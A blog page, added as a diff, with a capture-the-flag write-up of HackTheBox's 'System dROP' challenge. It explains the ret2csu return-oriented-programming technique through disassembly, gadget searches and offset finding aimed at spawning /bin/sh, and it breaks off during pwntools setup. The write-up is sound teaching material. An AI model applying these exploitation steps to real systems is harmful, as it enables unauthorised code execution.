@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-12497311-8"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-12497311-8');
+</script>
+
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="[audible]blink ">
+<meta name="description" content="What is __libc_csu_init anyway? Hackthebox hosted the CTF event, CyberPocalypse2021 this last week. Great event. Let&amp;rsquo;s talk about the System dROP challenge.
+A while ago, I&amp;rsquo;d read a BlackHat paper on something called &amp;lsquo;ret2csu&amp;rsquo;. The TL;DR is that glibc attaches code that bootstraps your C. Within the attached code, there exists two segments of assembly, that when used together, can be very useful in constructing ROP chains without needing bother with any ASLR&amp;rsquo;d library, provided there exists some other useful code within the main ELF." />
+<meta name="keywords" content="hacking, blog, science, infosec, development, programming" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://sec.alexflor.es/posts/2021/04/ret2csu/" />
+
+
+    <title>
+        
+            Ret2CSU :: [audible]blink 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.min.1bb63f0ef1f4773bed448ef455ce3d2c9408d68771fee3145edf2fdf8b7d1c01.css">
+
+
+
+
+<meta itemprop="name" content="Ret2CSU">
+<meta itemprop="description" content="What is __libc_csu_init anyway? Hackthebox hosted the CTF event, CyberPocalypse2021 this last week. Great event. Let&rsquo;s talk about the System dROP challenge.
+A while ago, I&rsquo;d read a BlackHat paper on something called &lsquo;ret2csu&rsquo;. The TL;DR is that glibc attaches code that bootstraps your C. Within the attached code, there exists two segments of assembly, that when used together, can be very useful in constructing ROP chains without needing bother with any ASLR&rsquo;d library, provided there exists some other useful code within the main ELF."><meta itemprop="datePublished" content="2021-04-24T11:42:16-04:00" />
+<meta itemprop="dateModified" content="2021-04-24T11:42:16-04:00" />
+<meta itemprop="wordCount" content="1949">
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Ret2CSU"/>
+<meta name="twitter:description" content="What is __libc_csu_init anyway? Hackthebox hosted the CTF event, CyberPocalypse2021 this last week. Great event. Let&rsquo;s talk about the System dROP challenge.
+A while ago, I&rsquo;d read a BlackHat paper on something called &lsquo;ret2csu&rsquo;. The TL;DR is that glibc attaches code that bootstraps your C. Within the attached code, there exists two segments of assembly, that when used together, can be very useful in constructing ROP chains without needing bother with any ASLR&rsquo;d library, provided there exists some other useful code within the main ELF."/>
+
+
+
+
+
+    <meta property="article:published_time" content="2021-04-24 11:42:16 -0400 EDT" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ cd ~/</span>
+            <span class="logo__cursor" style=""></span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://sec.alexflor.es/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>10 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article>
+            <h1 class="post-title">
+                <a href="https://sec.alexflor.es/posts/2021/04/ret2csu/">Ret2CSU</a>
+            </h1>
+
+            
+
+            <div class="post-content">
+                <h1 id="what-is-__libc_csu_init-anyway">What is <code>__libc_csu_init</code> anyway?</h1>
+<p>Hackthebox hosted the CTF event, CyberPocalypse2021 this last week. Great event.
+Let&rsquo;s talk about the <code>System dROP</code> challenge.</p>
+<p>A while ago, I&rsquo;d read a <a href="https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf">BlackHat paper</a>
+on something called &lsquo;ret2csu&rsquo;.
+The TL;DR is that glibc attaches code that bootstraps your C. Within the attached code, there
+exists two segments of assembly, that when used together, can be very useful in constructing ROP
+chains without needing bother with any ASLR&rsquo;d library, provided there exists some other useful code
+within the main ELF. There&rsquo;s an additional hurdle if PIE is enabled, but it remains just that, a
+temporary road block.</p>
+<p>I hadn&rsquo;t yet run into the need to use it, until this challenge.</p>
+<h2 id="sytem-drop">Sytem dROP</h2>
+<p>Maybe I didn&rsquo;t <em>need</em> ret2csu. If you take the capital letters (or the flag text itself) from this
+challenge, signs point to the use of the SROP, (or SIGret) technique. I didn&rsquo;t go that route. I&rsquo;ve
+written about SIGROP before, <a href="https://sec.alexflor.es/posts/2019/12/abusing-signals-with-sigrop-exploits/">check it
+out</a> if you&rsquo;re
+interested.</p>
+<h2 id="the-gadgets">The Gadgets</h2>
+<p>Here&rsquo;s the injected function&rsquo;s disassembled code.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#960050;background-color:#1e0010">0000000000400570</span> <span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#a6e22e">__libc_csu_init</span><span style="color:#f92672">&gt;</span>:
+  <span style="color:#960050;background-color:#1e0010">400570:</span>       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">57</span>                   <span style="color:#a6e22e">push</span>   r15
+  <span style="color:#960050;background-color:#1e0010">400572:</span>       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">56</span>                   <span style="color:#a6e22e">push</span>   r14
+  <span style="color:#960050;background-color:#1e0010">400574:</span>       <span style="color:#960050;background-color:#1e0010">49</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">d7</span>                mov    r15,rdx
+  <span style="color:#960050;background-color:#1e0010">400577:</span>       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">55</span>                   <span style="color:#a6e22e">push</span>   r13
+  <span style="color:#960050;background-color:#1e0010">400579:</span>       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">54</span>                   <span style="color:#a6e22e">push</span>   r12
+  <span style="color:#960050;background-color:#1e0010">40057</span>b:       <span style="color:#960050;background-color:#1e0010">4</span><span style="color:#a6e22e">c</span> <span style="color:#ae81ff">8</span>d <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">8</span>e <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span>    lea    r12,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x20088e</span>]        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">600</span>e10 <span style="color:#f92672">&lt;</span>__frame_dummy_init_array_entry<span style="color:#f92672">&gt;</span>
+  <span style="color:#960050;background-color:#1e0010">400582:</span>       <span style="color:#960050;background-color:#1e0010">55</span>                      <span style="color:#a6e22e">push</span>   rbp
+  <span style="color:#960050;background-color:#1e0010">400583:</span>       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#a6e22e">d</span> <span style="color:#ae81ff">2</span>d <span style="color:#ae81ff">8</span>e <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span>    lea    rbp,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x20088e</span>]        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">600</span>e18 <span style="color:#f92672">&lt;</span>__do_global_dtors_aux_fini_array_entry<span style="color:#f92672">&gt;</span>
+  <span style="color:#960050;background-color:#1e0010">40058</span>a:       <span style="color:#960050;background-color:#1e0010">53</span>                      <span style="color:#a6e22e">push</span>   rbx
+  <span style="color:#960050;background-color:#1e0010">40058</span>b:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">fd</span>                mov    r13d,edi
+  <span style="color:#960050;background-color:#1e0010">40058</span>e:       <span style="color:#960050;background-color:#1e0010">49</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">f6</span>                mov    r14,rsi
+  <span style="color:#960050;background-color:#1e0010">400591:</span>       <span style="color:#960050;background-color:#1e0010">4</span><span style="color:#a6e22e">c</span> <span style="color:#ae81ff">29</span> e5                sub    rbp,r12
+  <span style="color:#960050;background-color:#1e0010">400594:</span>       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">83</span> <span style="color:#a6e22e">ec</span> <span style="color:#ae81ff">08</span>             sub    rsp,<span style="color:#ae81ff">0x8</span>
+  <span style="color:#960050;background-color:#1e0010">400598:</span>       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#a6e22e">c1</span> fd <span style="color:#ae81ff">03</span>             sar    rbp,<span style="color:#ae81ff">0x3</span>
+  <span style="color:#960050;background-color:#1e0010">40059</span>c:       <span style="color:#a6e22e">e8</span> <span style="color:#ae81ff">5</span>f fe ff ff          call   <span style="color:#ae81ff">400400</span> <span style="color:#f92672">&lt;</span>_init<span style="color:#f92672">&gt;</span>
+  <span style="color:#960050;background-color:#1e0010">4005</span>a1:       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">85</span> <span style="color:#a6e22e">ed</span>                test   rbp,rbp
+  <span style="color:#960050;background-color:#1e0010">4005</span>a4:       <span style="color:#960050;background-color:#1e0010">74</span> <span style="color:#960050;background-color:#1e0010">20</span>                   <span style="color:#a6e22e">je</span>     <span style="color:#ae81ff">4005</span>c6 <span style="color:#f92672">&lt;</span>__libc_csu_init<span style="color:#f92672">+</span><span style="color:#ae81ff">0x56</span><span style="color:#f92672">&gt;</span>
+  <span style="color:#960050;background-color:#1e0010">4005</span>a6:       <span style="color:#960050;background-color:#1e0010">31</span> <span style="color:#66d9ef">db</span>                   xor    ebx,ebx
+  <span style="color:#960050;background-color:#1e0010">4005</span>a8:       <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">f</span> <span style="color:#ae81ff">1</span>f <span style="color:#ae81ff">84</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>    nop    <span style="color:#66d9ef">DWORD</span> PTR [rax<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span>]
+  <span style="color:#960050;background-color:#1e0010">4005</span>af:       <span style="color:#960050;background-color:#1e0010">00</span>
+  <span style="color:#960050;background-color:#1e0010">4005</span>b0:       <span style="color:#960050;background-color:#1e0010">4</span><span style="color:#a6e22e">c</span> <span style="color:#ae81ff">89</span> fa                mov    rdx,r15
+  <span style="color:#960050;background-color:#1e0010">4005</span>b3:       <span style="color:#960050;background-color:#1e0010">4</span><span style="color:#a6e22e">c</span> <span style="color:#ae81ff">89</span> f6                mov    rsi,r14
+  <span style="color:#960050;background-color:#1e0010">4005</span>b6:       <span style="color:#960050;background-color:#1e0010">44</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">ef</span>                mov    edi,r13d
+  <span style="color:#960050;background-color:#1e0010">4005</span>b9:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#a6e22e">ff</span> <span style="color:#ae81ff">14</span> dc             call   <span style="color:#66d9ef">QWORD</span> PTR [r12<span style="color:#f92672">+</span>rbx<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>]
+  <span style="color:#960050;background-color:#1e0010">4005</span>bd:       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">83</span> <span style="color:#a6e22e">c3</span> <span style="color:#ae81ff">01</span>             add    rbx,<span style="color:#ae81ff">0x1</span>
+  <span style="color:#960050;background-color:#1e0010">4005</span>c1:       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">39</span> <span style="color:#66d9ef">dd</span>                cmp    rbp,rbx
+  <span style="color:#960050;background-color:#1e0010">4005</span>c4:       <span style="color:#960050;background-color:#1e0010">75</span> <span style="color:#a6e22e">ea</span>                   jne    <span style="color:#ae81ff">4005</span>b0 <span style="color:#f92672">&lt;</span>__libc_csu_init<span style="color:#f92672">+</span><span style="color:#ae81ff">0x40</span><span style="color:#f92672">&gt;</span>
+  <span style="color:#960050;background-color:#1e0010">4005</span>c6:       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">83</span> <span style="color:#a6e22e">c4</span> <span style="color:#ae81ff">08</span>             add    rsp,<span style="color:#ae81ff">0x8</span>
+  <span style="color:#960050;background-color:#1e0010">4005</span>ca:       <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">b</span>                      pop    rbx
+  <span style="color:#960050;background-color:#1e0010">4005</span>cb:       <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">d</span>                      pop    rbp
+  <span style="color:#960050;background-color:#1e0010">4005</span>cc:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">c</span>                   pop    r12
+  <span style="color:#960050;background-color:#1e0010">4005</span>ce:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">d</span>                   pop    r13
+  <span style="color:#960050;background-color:#1e0010">4005</span>d0:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">e</span>                   pop    r14
+  <span style="color:#960050;background-color:#1e0010">4005</span>d2:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">f</span>                   pop    r15
+  <span style="color:#960050;background-color:#1e0010">4005</span>d4:       <span style="color:#a6e22e">c3</span>                      ret
+  <span style="color:#960050;background-color:#1e0010">4005</span>d5:       <span style="color:#960050;background-color:#1e0010">90</span>                      <span style="color:#a6e22e">nop</span>
+  <span style="color:#960050;background-color:#1e0010">4005</span>d6:       <span style="color:#960050;background-color:#1e0010">66</span> <span style="color:#960050;background-color:#1e0010">2</span><span style="color:#a6e22e">e</span> <span style="color:#ae81ff">0</span>f <span style="color:#ae81ff">1</span>f <span style="color:#ae81ff">84</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>    nop    <span style="color:#66d9ef">WORD</span> PTR cs:[rax<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span>]
+</code></pre></div><p>The two relevant pieces are (we&rsquo;ll get to why in a bit):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">  <span style="color:#960050;background-color:#1e0010">4005</span>ca:       <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">b</span>                      pop    rbx
+  <span style="color:#960050;background-color:#1e0010">4005</span>cb:       <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">d</span>                      pop    rbp
+  <span style="color:#960050;background-color:#1e0010">4005</span>cc:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">c</span>                   pop    r12
+  <span style="color:#960050;background-color:#1e0010">4005</span>ce:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">d</span>                   pop    r13
+  <span style="color:#960050;background-color:#1e0010">4005</span>d0:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">e</span>                   pop    r14
+  <span style="color:#960050;background-color:#1e0010">4005</span>d2:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">f</span>                   pop    r15
+  <span style="color:#960050;background-color:#1e0010">4005</span>d4:       <span style="color:#a6e22e">c3</span>                      ret
+
+
+  <span style="color:#960050;background-color:#1e0010">4005</span>b0:       <span style="color:#960050;background-color:#1e0010">4</span><span style="color:#a6e22e">c</span> <span style="color:#ae81ff">89</span> fa                mov    rdx,r15
+  <span style="color:#960050;background-color:#1e0010">4005</span>b3:       <span style="color:#960050;background-color:#1e0010">4</span><span style="color:#a6e22e">c</span> <span style="color:#ae81ff">89</span> f6                mov    rsi,r14
+  <span style="color:#960050;background-color:#1e0010">4005</span>b6:       <span style="color:#960050;background-color:#1e0010">44</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">ef</span>                mov    edi,r13d
+  <span style="color:#960050;background-color:#1e0010">4005</span>b9:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#a6e22e">ff</span> <span style="color:#ae81ff">14</span> dc             call   <span style="color:#66d9ef">QWORD</span> PTR [r12<span style="color:#f92672">+</span>rbx<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>]
+</code></pre></div><h2 id="the-code">The Code</h2>
+<p><code>main:</code> calls 2 functions, then returns</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#960050;background-color:#1e0010">400541:</span>       <span style="color:#960050;background-color:#1e0010">55</span>                      <span style="color:#a6e22e">push</span>   rbp
+<span style="color:#960050;background-color:#1e0010">400542:</span>       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">e5</span>                mov    rbp,rsp
+<span style="color:#960050;background-color:#1e0010">400545:</span>       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">83</span> <span style="color:#a6e22e">ec</span> <span style="color:#ae81ff">20</span>             sub    rsp,<span style="color:#ae81ff">0x20</span>
+<span style="color:#960050;background-color:#1e0010">400549:</span>       <span style="color:#a6e22e">bf</span> <span style="color:#ae81ff">0</span>f <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>          mov    edi,<span style="color:#ae81ff">0xf</span>
+<span style="color:#960050;background-color:#1e0010">40054</span>e:       <span style="color:#a6e22e">e8</span> dd fe ff ff          call   <span style="color:#ae81ff">400430</span> <span style="color:#f92672">&lt;</span>alarm@plt<span style="color:#f92672">&gt;</span>
+<span style="color:#960050;background-color:#1e0010">400553:</span>       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#a6e22e">d</span> <span style="color:#ae81ff">45</span> e0             lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
+<span style="color:#960050;background-color:#1e0010">400557:</span>       <span style="color:#a6e22e">ba</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>          mov    edx,<span style="color:#ae81ff">0x100</span>
+<span style="color:#960050;background-color:#1e0010">40055</span>c:       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">c6</span>                mov    rsi,rax
+<span style="color:#960050;background-color:#1e0010">40055</span>f:       <span style="color:#a6e22e">bf</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>          mov    edi,<span style="color:#ae81ff">0x0</span>
+<span style="color:#960050;background-color:#1e0010">400564:</span>       <span style="color:#a6e22e">e8</span> d7 fe ff ff          call   <span style="color:#ae81ff">400440</span> <span style="color:#f92672">&lt;</span>read@plt<span style="color:#f92672">&gt;</span>
+<span style="color:#960050;background-color:#1e0010">400569:</span>       <span style="color:#a6e22e">b8</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>          mov    eax,<span style="color:#ae81ff">0x1</span>
+<span style="color:#960050;background-color:#1e0010">40056</span>e:       <span style="color:#a6e22e">c9</span>                      leave
+<span style="color:#960050;background-color:#1e0010">40056</span>f:       <span style="color:#a6e22e">c3</span>                      ret
+</code></pre></div><p>The code is fairly simple. We&rsquo;ve also only 2 imports from <code>libc</code>, <code>alarm</code>, and <code>read</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#960050;background-color:#1e0010">0000000000400430</span> <span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#a6e22e">alarm@plt</span><span style="color:#f92672">&gt;</span>:
+  <span style="color:#960050;background-color:#1e0010">400430:</span>       <span style="color:#a6e22e">ff</span> <span style="color:#ae81ff">25</span> e2 <span style="color:#ae81ff">0b</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span>       jmp    <span style="color:#66d9ef">QWORD</span> PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200be2</span>]        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">601018</span> <span style="color:#f92672">&lt;</span>alarm@GLIBC_2.2.5<span style="color:#f92672">&gt;</span>
+  <span style="color:#960050;background-color:#1e0010">400436:</span>       <span style="color:#960050;background-color:#1e0010">68</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span>          <span style="color:#a6e22e">push</span>   <span style="color:#ae81ff">0x0</span>
+  <span style="color:#960050;background-color:#1e0010">40043</span>b:       <span style="color:#a6e22e">e9</span> e0 ff ff ff          jmp    <span style="color:#ae81ff">400420</span> <span style="color:#f92672">&lt;</span>.plt<span style="color:#f92672">&gt;</span>
+
+<span style="color:#960050;background-color:#1e0010">0000000000400440</span> <span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#a6e22e">read@plt</span><span style="color:#f92672">&gt;</span>:
+  <span style="color:#960050;background-color:#1e0010">400440:</span>       <span style="color:#a6e22e">ff</span> <span style="color:#ae81ff">25</span> da <span style="color:#ae81ff">0b</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span>       jmp    <span style="color:#66d9ef">QWORD</span> PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200bda</span>]        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">601020</span> <span style="color:#f92672">&lt;</span>read@GLIBC_2.2.5<span style="color:#f92672">&gt;</span>
+  <span style="color:#960050;background-color:#1e0010">400446:</span>       <span style="color:#960050;background-color:#1e0010">68</span> <span style="color:#960050;background-color:#1e0010">01</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span>          <span style="color:#a6e22e">push</span>   <span style="color:#ae81ff">0x1</span>
+</code></pre></div><h2 id="the-plan">The Plan</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯❯ ropper --search <span style="color:#e6db74">&#39;syscall&#39;</span> --file ./system_drop
+
+<span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> File: ./system_drop
+0x000000000040053b: syscall; ret;
+</code></pre></div><p>Further analysis will reveal the existence of a <code>syscall</code> instruction within the binary. We should
+be able to use this to our advantage to call <code>execve('/bin/sh', 0, 0)</code>.</p>
+<h3 id="overview">Overview</h3>
+<ol>
+<li>Find our buffer length</li>
+<li>Our initial payload will contain all of the <em>actions</em> of our exploit path. (Timey, wimey)</li>
+<li>We&rsquo;ll trigger an additional read half way through our payload.
+<ul>
+<li>This will provide the second half with the <em>data</em> it needs to finish the exploit</li>
+</ul>
+</li>
+</ol>
+<h3 id="deeper-dive">Deeper Dive</h3>
+<p>The first leg of our ret2csu attack will focus on populating some seemingly-arbitrary registers. It
+may seem useless to put <code>syscall</code> and &ldquo;/bin/sh&rdquo; into <code>r12</code> and <code>r13</code>, after all, that&rsquo;s not the
+correct calling convention for x64 asm. The second leg of our csu code will do the rest of the
+lifting for us though.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x4005b0</span>      mov rdx, r15
+<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x4005b3</span>      mov rsi, r14
+<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x4005b6</span>      mov edi, r13d
+<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x4005b9</span>      call <span style="color:#66d9ef">qword</span> [r12 <span style="color:#f92672">+</span> rbx<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>]
+</code></pre></div><p>You&rsquo;ll notice that the <code>call</code> instruction at <code>0x4005b9</code> is de-referencing <code>r12 + rbx*8</code>. If we
+provide <code>0</code> to <code>rbx</code>, and a pointer to an address holding the instruction we want called, we should
+be in business. We&rsquo;ll also have to set <code>rax</code> to <code>59</code>, the <code>syscall</code> number for <code>execve</code>. Luckily,
+the return value of <code>read</code> is the length of input (we control this!), and that value gets stored at
+<code>rax</code>.</p>
+<p>We have yet to discuss two final pieces of this puzzle. The locations of the string &ldquo;/bin/sh&rdquo; and a
+pointer to <code>syscall</code>&rsquo;s location'. In this instance, we can simply create that data using the <code>read</code>
+function.</p>
+<p>The <code>.bss</code> section of an ELF gets loaded into memory as a <code>rw-</code> segment. This will do nicely. We
+don&rsquo;t need execution on this data. Given a known-constant address that&rsquo;s writeable, we can use this
+address as arguments to functions we want to set up, even if the data there is yet to be written.</p>
+<p>We&rsquo;ll need a gadget to set <code>rsi</code>, our read destination aka <code>bss</code></p>
+<pre><code>NAME
+       read - read from a file descriptor
+SYNOPSIS
+                      rdi      rsi         rsx
+       ssize_t read(int fd, void *buf, size_t count);
+</code></pre><p>Half way through our exploit, we&rsquo;ll read the values in to the locations where we told future
+instructions to look.</p>
+<p>Abstractly, this is difficult to explain. We&rsquo;re essentially planning out 2 moves in advance,
+whereby the first move requests additional data in order to correctly complete the second. Again,
+Timey, wimey</p>
+<h2 id="the-exploit">The Exploit</h2>
+<h3 id="finding-the-offset">Finding the offset</h3>
+<p>We&rsquo;ll keep this section short. It&rsquo;s 40.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; r &lt;&lt;<span style="color:#f92672">(</span>cyclic 80<span style="color:#f92672">)</span>
+Starting program: ./system_drop &lt;&lt;<span style="color:#f92672">(</span>cyclic 80<span style="color:#f92672">)</span>
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000040056f in main <span style="color:#f92672">()</span>
+
+pwndbg&gt; x/dx $rsp
+0x7fffffffe1c8: 0x6161616b
+pwndbg&gt; cyclic -l 0x6161616b
+<span style="color:#ae81ff">40</span>
+</code></pre></div><h3 id="getting-the-bss-addresses">Getting the <code>.bss</code> addresses</h3>
+<p>You can get this dynamically from <code>pwntools</code> or manually with <code>objdump</code> or any disassembler of your
+choice.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+In [<span style="color:#ae81ff">2</span>]: context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./system_drop&#34;</span>
+    Arch:     amd64<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (<span style="color:#ae81ff">0x400000</span>)
